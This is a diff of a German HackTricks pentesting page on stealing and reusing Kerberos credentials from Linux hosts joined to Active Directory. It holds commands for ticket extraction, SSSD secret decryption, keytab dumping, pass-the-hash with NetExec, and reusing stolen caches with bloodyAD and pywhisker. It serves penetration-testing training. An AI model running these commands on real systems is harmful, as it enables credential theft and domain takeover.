@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Eine Linux-Maschine kann ebenfalls in einer Active-Directory-Umgebung vorhanden sein.
+Eine Linux-Maschine kann sich ebenfalls innerhalb einer Active-Directory-Umgebung befinden.
 
-Eine Linux-Maschine innerhalb einer AD-Umgebung kann **Kerberos-Material lokal speichern**: Benutzer-Caches, Maschinen-/Service-Keytabs und von SSSD verwaltete Secrets. Diese Artefakte können normalerweise wie alle anderen Kerberos-Credentials wiederverwendet werden. Um die meisten davon zu lesen, musst du der Benutzer sein, dem das Ticket gehört, oder **root** auf der Maschine sein.
+Eine Linux-Maschine innerhalb einer AD-Umgebung kann **Kerberos-Material lokal speichern**: Benutzer-Caches, Maschinen-/Service-Keytabs und von SSSD verwaltete Secrets. Diese Artefakte können normalerweise wie alle anderen Kerberos-Credentials wiederverwendet werden. Um die meisten davon zu lesen, müssen Sie der Benutzer sein, dem das Ticket gehört, oder **root** auf der Maschine sein.
 
 ## Enumeration
 
-### AD enumeration from linux
+### AD-Enumeration unter Linux
 
-Wenn du Zugriff auf ein AD unter Linux (oder auf eine Bash-Shell in Windows) hast, kannst du [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) verwenden, um das AD zu enumerieren.
+Wenn Sie Zugriff auf eine AD-Umgebung unter Linux (oder auf eine Bash-Shell unter Windows) haben, können Sie [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) zur Enumeration der AD ausprobieren.
 
-Du kannst auch die folgende Seite aufrufen, um **weitere Möglichkeiten zur Enumeration von AD unter Linux** kennenzulernen:
+Sie können auch die folgende Seite aufrufen, um **weitere Möglichkeiten zur Enumeration von AD unter Linux** kennenzulernen:
 
 
 {{#ref}}
@@ -21,7 +21,7 @@ Du kannst auch die folgende Seite aufrufen, um **weitere Möglichkeiten zur Enum
 
 ### FreeIPA
 
-FreeIPA ist eine Open-Source-**Alternative** zu Microsoft Windows **Active Directory**, hauptsächlich für **Unix**-Umgebungen. Es kombiniert ein vollständiges **LDAP-Verzeichnis** mit einem MIT-**Kerberos**-Key Distribution Center für eine Verwaltung ähnlich wie bei Active Directory. Durch die Verwendung des Dogtag-**Certificate-Systems** für die Verwaltung von CA- und RA-Zertifikaten unterstützt es **Multi-Faktor**-Authentifizierung, einschließlich Smartcards. SSSD ist für Unix-Authentifizierungsprozesse integriert. Mehr darüber erfährst du hier:
+FreeIPA ist eine Open-Source-**Alternative** zu Microsoft Windows **Active Directory**, hauptsächlich für **Unix**-Umgebungen. Es kombiniert ein vollständiges **LDAP-Verzeichnis** mit einem MIT-**Kerberos**-Key Distribution Center für eine Verwaltung ähnlich wie bei Active Directory. Durch die Nutzung des **Certificate System** von Dogtag für die Verwaltung von CA- und RA-Zertifikaten unterstützt es **Multi-Faktor**-Authentifizierung, einschließlich Smartcards. SSSD ist für Unix-Authentifizierungsprozesse integriert. Weitere Informationen finden Sie unter:
 
 
 {{#ref}}
@@ -30,7 +30,7 @@ FreeIPA ist eine Open-Source-**Alternative** zu Microsoft Windows **Active Direc
 
 ### Artefakte von domain-joined Hosts
 
-Bevor du dich mit Tickets beschäftigst, solltest du feststellen, **wie der Host zu AD hinzugefügt wurde** und **wo das Kerberos-Material tatsächlich gespeichert ist**. Auf modernen Linux-Hosts wird dies üblicherweise mit `realmd` + `adcli` + `sssd` gehandhabt und nicht nur über einfache Dateien in `/tmp`:
+Bevor Sie sich mit Tickets befassen, sollten Sie ermitteln, **wie der Host der AD beigetreten ist** und **wo das Kerberos-Material tatsächlich gespeichert wird**. Auf modernen Linux-Hosts wird dies häufig durch `realmd` + `adcli` + `sssd` verwaltet und nicht nur durch einfache Dateien in `/tmp`:
 ```bash
 # Is the host joined to a realm/domain?
 realm list 2>/dev/null
@@ -45,19 +45,20 @@ klist -k /etc/krb5.keytab 2>/dev/null
 find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
 find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
 ```
-Dies zeigt schnell, ob der Host AD vertraut, ob SSSD Identitäten oder Tickets cached und ob **Machine-/Service-Keytabs** oder **KCM-Secrets** zur Ausnutzung verfügbar sind.
+Dies zeigt schnell, ob der Host der AD vertraut, ob SSSD Identitäten oder Tickets cached und ob **machine/service keytabs** oder **KCM secrets** zur missbräuchlichen Nutzung verfügbar sind.
 
-## Arbeiten mit Tickets
+## Mit Tickets arbeiten
 
 ### Pass The Ticket
 
-Auf dieser Seite findest du verschiedene Orte, an denen du **Kerberos-Tickets innerhalb eines Linux-Hosts finden** kannst. Auf der folgenden Seite erfährst du, wie du diese CCache-Ticketformate in Kirbi (das Format, das du unter Windows verwenden musst) umwandelst und wie du einen PTT-Angriff durchführst:
+Auf dieser Seite findest du verschiedene Orte, an denen du **Kerberos-Tickets innerhalb eines Linux-Hosts finden** kannst. Auf der folgenden Seite erfährst du, wie du diese CCache-Ticketformate in Kirbi umwandelst (das Format, das du unter Windows verwenden musst) und wie du einen PTT-Angriff durchführst:
+
 
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/pass-the-ticket.md
 {{#endref}}
 
-Wenn du die **Linux-spezifischen Workflows zur Ticket-Ernte** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` usw.) suchst, findest du sie auf der entsprechenden Seite:
+Wenn du die **Linux-spezifischen Ticket-Harvesting-Workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` usw.) suchst, findest du sie auf der dafür vorgesehenen Seite:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
@@ -65,7 +66,7 @@ Wenn du die **Linux-spezifischen Workflows zur Ticket-Ernte** (`FILE`, `DIR`, `K
 
 ### Wiederverwendung von CCACHE-Tickets aus /tmp
 
-CCACHE-Dateien sind Binärformate zum **Speichern von Kerberos-Anmeldedaten**. `FILE:/tmp/krb5cc_%{uid}` ist weiterhin verbreitet, aber moderne Linux-Deployments verwenden auch `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` oder `KCM:%{uid}`. Überprüfe die Umgebungsvariable **`KRB5CCNAME`** und die Einstellung `default_ccache_name`, bevor du annimmst, dass sich Tickets in `/tmp` befinden.
+CCACHE-Dateien sind Binärformate zum **Speichern von Kerberos-Credentials**. `FILE:/tmp/krb5cc_%{uid}` ist weiterhin üblich, aber moderne Linux-Deployments verwenden auch `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` oder `KCM:%{uid}`. Überprüfe die Umgebungsvariable **`KRB5CCNAME`** und die Einstellung `default_ccache_name`, bevor du davon ausgehst, dass sich Tickets in `/tmp` befinden.<sup>[[1]](#references)</sup>
 ```bash
 # Where is the current process reading credentials from?
 env | grep KRB5CCNAME
@@ -81,29 +82,29 @@ klist
 ```
 ### CCACHE-Ticket-Wiederverwendung aus dem Keyring
 
-**Kerberos-Tickets, die im Speicher eines Prozesses gespeichert sind, können extrahiert werden**, insbesondere wenn der ptrace-Schutz des Computers deaktiviert ist (`/proc/sys/kernel/yama/ptrace_scope`). Ein nützliches Tool für diesen Zweck ist unter [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) zu finden. Es ermöglicht die Extraktion, indem es sich in Sitzungen injiziert und Tickets nach `/tmp` dumpt.
+**Kerberos-Tickets, die im Speicher eines Prozesses gespeichert sind, können extrahiert werden**, insbesondere wenn der ptrace-Schutz deaktiviert ist (`/proc/sys/kernel/yama/ptrace_scope`). Ein nützliches Tool für diesen Zweck ist unter [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) zu finden. Es erleichtert die Extraktion, indem es sich in Sessions injiziert und Tickets nach `/tmp` dumpt.
 
-Zur Konfiguration und Verwendung dieses Tools werden die folgenden Schritte ausgeführt:
+Um dieses Tool zu konfigurieren und zu verwenden, werden die folgenden Schritte ausgeführt:
 ```bash
 git clone https://github.com/TarlogicSecurity/tickey
 cd tickey/tickey
 make CONF=Release
 /tmp/tickey -i
 ```
-Dieses Verfahren versucht, sich in verschiedene Sessions einzuschleusen. Ein Erfolg wird dadurch angezeigt, dass extrahierte Tickets in `/tmp` nach dem Namensschema `__krb_UID.ccache` gespeichert werden.
+Dieser Vorgang versucht, sich in verschiedene Sessions zu injizieren, und zeigt den Erfolg an, indem extrahierte Tickets mit der Namenskonvention `__krb_UID.ccache` in `/tmp` gespeichert werden.<sup>[[1]](#references)</sup>
 
-### CCACHE-Ticket-Wiederverwendung aus SSSD KCM
+### Wiederverwendung von CCACHE-Tickets aus SSSD KCM
 
 SSSD verwaltet eine Kopie der Datenbank unter dem Pfad `/var/lib/sss/secrets/secrets.ldb`. Der zugehörige Schlüssel wird als versteckte Datei unter dem Pfad `/var/lib/sss/secrets/.secrets.mkey` gespeichert. Standardmäßig ist der Schlüssel nur lesbar, wenn Sie über **root**-Berechtigungen verfügen.
 
-Durch Aufrufen von **`SSSDKCMExtractor`** mit den Parametern --database und --key werden die Datenbank analysiert und die **Secrets entschlüsselt**.
+Der Aufruf von **`SSSDKCMExtractor`** mit den Parametern --database und --key analysiert die Datenbank und **entschlüsselt die Secrets**.
 ```bash
 git clone https://github.com/fireeye/SSSDKCMExtractor
 python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
 ```
-Der **Kerberos credential cache blob kann in eine verwendbare Kerberos CCache-Datei konvertiert werden**, die an Mimikatz/Rubeus übergeben werden kann.
+Der **Kerberos-Credential-Cache-Blob kann in eine verwendbare Kerberos-CCache-Datei konvertiert werden**, die an Mimikatz/Rubeus übergeben werden kann.
 
-### Schnelle keytab-Triage
+### Schnelle Keytab-Triage
 ```bash
 # Inspect available principals and enctypes
 klist -k -e /etc/krb5.keytab
@@ -114,14 +115,14 @@ klist
 ```
 ### Konten aus /etc/krb5.keytab extrahieren
 
-Schlüssel von Dienstkonten, die für Dienste mit root-Rechten unerlässlich sind, werden sicher in **`/etc/krb5.keytab`**-Dateien gespeichert. Diese Schlüssel, die für Dienste Passwörtern ähneln, erfordern strikte Vertraulichkeit.
+Schlüssel von Servicekonten, die für Dienste mit root-Rechten unerlässlich sind, werden sicher in **`/etc/krb5.keytab`**-Dateien gespeichert. Diese Schlüssel, die für Dienste passwortähnliche Funktionen erfüllen, müssen streng vertraulich behandelt werden.
 
-Um den Inhalt der keytab-Datei zu überprüfen, kann **`klist`** verwendet werden. Unter Linux gibt `klist -k -K -e` die Principals, Schlüsselversionsnummern, Verschlüsselungstypen und das Rohschlüsselmaterial aus. Wenn der Schlüsseltyp **23 / RC4-HMAC** ist, entspricht der Schlüsselwert auch dem **NT-Hash** dieses Principals.
+Zur Untersuchung des Inhalts der keytab-Datei kann **`klist`** verwendet werden. Unter Linux gibt `klist -k -K -e` die Principals, Schlüsselversionsnummern, Verschlüsselungstypen und das rohe Schlüsselmaterial aus. Wenn der Schlüsseltyp **23 / RC4-HMAC** ist, entspricht der Schlüsselwert außerdem dem **NT-Hash** dieses Principals.
 ```bash
 klist -k -K -e /etc/krb5.keytab
 # RC4-HMAC entries expose reusable NTLM material; AES entries do not
 ```
-Für Linux-Benutzer bietet **`KeyTabExtract`** Funktionen zum Extrahieren des RC4-HMAC-Hashs, der für die Wiederverwendung von NTLM-Hashes genutzt werden kann. Dies funktioniert jedoch nur, wenn die Keytab weiterhin Material für **etype 23 / RC4-HMAC** enthält. In **AES-only**-Umgebungen erhalten Sie möglicherweise keinen wiederverwendbaren NT-Hash, können sich aber weiterhin direkt über Kerberos mit der Keytab authentifizieren.
+Für Linux-Benutzer bietet **`KeyTabExtract`** Funktionen zum Extrahieren des RC4-HMAC-Hashes, der zur Wiederverwendung von NTLM-Hashes verwendet werden kann. Dies ist jedoch nur hilfreich, wenn die Keytab weiterhin **etype 23 / RC4-HMAC**-Schlüsselmaterial enthält. In **AES-only**-Umgebungen erhalten Sie möglicherweise keinen wiederverwendbaren NT-Hash, können sich aber weiterhin direkt mit der Keytab über Kerberos authentifizieren.
 ```bash
 python3 keytabextract.py krb5.keytab
 # Expected output varies based on hash availability
@@ -130,7 +131,7 @@ Unter macOS dient **`bifrost`** als Tool zur Analyse von Keytab-Dateien.
 ```bash
 ./bifrost -action dump -source keytab -path /path/to/your/file
 ```
-Unter Verwendung der extrahierten Konto- und Hash-Informationen können mithilfe von Tools wie **`NetExec`** Verbindungen zu Servern hergestellt werden.
+Mithilfe der extrahierten Konto- und Hash-Informationen können Verbindungen zu Servern mit Tools wie **`NetExec`** hergestellt werden.
 ```bash
 # NTLM/RC4 material recovered from etype 23 entries
 nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
@@ -138,9 +139,9 @@ nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
 # Or reuse a Kerberos cache directly
 KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
 ```
-### Das Computerkonto aus `/etc/krb5.keytab` wiederverwenden
+### Computerkonto aus `/etc/krb5.keytab` wiederverwenden
 
-Auf Systemen, die mit `realmd`/`adcli`/`sssd` eingebunden wurden, enthält `/etc/krb5.keytab` normalerweise das **Computerkonto** sowie einen oder mehrere **Host-/Service-Principals**. Wenn du **root** hast, solltest du die Datei nicht einfach ausgeben: Verwende stattdessen einen der mit `klist -k` aufgelisteten Principals, um ein TGT anzufordern und als der Linux-Host selbst zu agieren.
+Auf Systemen, die mit `realmd`/`adcli`/`sssd` eingebunden sind, enthält `/etc/krb5.keytab` normalerweise das **Computerkonto** sowie einen oder mehrere **Host-/Service-Principals**. Wenn du **root** hast, führe nicht einfach einen dump durch: Verwende einen der von `klist -k` aufgelisteten Principals, um ein TGT anzufordern und als der Linux-Host selbst zu agieren.
 ```bash
 # Identify usable principals first
 klist -k /etc/krb5.keytab
@@ -153,11 +154,11 @@ klist
 ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
 kvno ldap/dc.domain.local
 ```
-Dies ist besonders nützlich, wenn das **Computerobjekt** selbst delegierte Berechtigungen in AD besitzt oder der Host andere Secrets wie ein **gMSA** abrufen darf.
+Dies ist besonders nützlich, wenn das **computer object** selbst delegierte Berechtigungen in AD besitzt oder der Host andere Secrets wie ein **gMSA** abrufen darf.
 
 ### Gestohlenes Kerberos-Material mit Linux-first-AD-Tools wiederverwenden
 
-Sobald du über einen gültigen `ccache` oder ein nutzbares Keytab verfügst, kannst du direkt von **Linux** aus gegen AD vorgehen, ohne vorher alles in Windows-Formate konvertieren zu müssen. Viele moderne Tools akzeptieren `KRB5CCNAME` / Kerberos-Authentifizierung nativ:
+Sobald du über einen gültigen `ccache` oder einen nutzbaren Keytab verfügst, kannst du direkt von **Linux** aus gegen AD arbeiten, ohne zunächst alles in Windows-Formate konvertieren zu müssen. Viele moderne Tools akzeptieren `KRB5CCNAME` / Kerberos-Authentifizierung nativ:
 ```bash
 # Reuse a stolen cache with bloodyAD for LDAP-side actions
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'
@@ -166,7 +167,7 @@ KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get objec
 KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
 --target 'WEB01$' --action list
 ```
-Dies ist eine gute Brücke zwischen **Linux post-exploitation** und **AD object abuse**. Für die eigentlichen Object-Level-Abuse-Pfade siehe:
+Dies ist eine gute Verbindung zwischen **Linux post-exploitation** und dem Missbrauch von **AD objects**. Informationen zu den eigentlichen Object-Level-Missbrauchswegen findest du unter:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-ldap.md
@@ -176,9 +177,9 @@ Dies ist eine gute Brücke zwischen **Linux post-exploitation** und **AD object 
 ../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
 {{#endref}}
 
-### Linux-gMSA-/Managed-Service-Account-Artefakte
+### Linux-gMSA- / Managed-Service-Account-Artefakte
 
-Aktuelle Linux-Deployments können **Managed Service Accounts** direkt aus AD verwenden. In der Praxis bedeutet dies, dass man nach der Kompromittierung eines Linux-Servers nicht nur das Host-Keytab, sondern auch **service-spezifische Keytabs** finden kann, die aus einer gMSA generiert wurden. Häufige Fundorte sind `/etc/gmsad.conf`, deploymentspezifische Konfigurationsdateien und zusätzliche `*.keytab`-Dateien unter `/etc`.
+Neuere Linux-Deployments können **Managed Service Accounts** direkt aus AD verwenden. In der Praxis bedeutet dies, dass du nach der Kompromittierung eines Linux-Servers möglicherweise nicht nur das Host-Keytab, sondern auch **service-spezifische Keytabs** findest, die aus einer gMSA generiert wurden. Häufige Orte zur Suche sind `/etc/gmsad.conf`, deployment-spezifische Konfigurationsdateien und zusätzliche `*.keytab`-Dateien unter `/etc`.<sup>[[2]](#references)</sup>
 ```bash
 # Look for gMSA-related configuration and extra keytabs
 grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
@@ -192,7 +193,7 @@ klist -kt /etc/service.keytab
 kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
 klist
 ```
-Dies verschafft dir eine wiederverwendbare Kerberos-Identität für die an diese SPNs gebundenen gMSAs, **ohne einen Windows-Endpunkt zu berühren**. Informationen zum **domänenseitigen** Missbrauch von gMSA/dMSA nach dem Erlangen höherer Berechtigungen in AD findest du unter:
+Dies gibt dir eine wiederverwendbare Kerberos-Identität für die an diese SPNs gebundenen gMSAs, **ohne einen Windows-Endpunkt zu berühren**. Für domain-seitigen gMSA/dMSA abuse nach dem Erlangen höherer Berechtigungen in AD siehe:
 
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
@@ -200,7 +201,7 @@ Dies verschafft dir eine wiederverwendbare Kerberos-Identität für die an diese
 
 ## Referenzen
 
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
+- [1] [Kerberos (II): Wie greift man Kerberos an?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [2] [Zugriff auf AD mit einem Managed Service Account – Direkte Integration von RHEL-Systemen in Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
 
 {{#include ../../banners/hacktricks-training.md}}
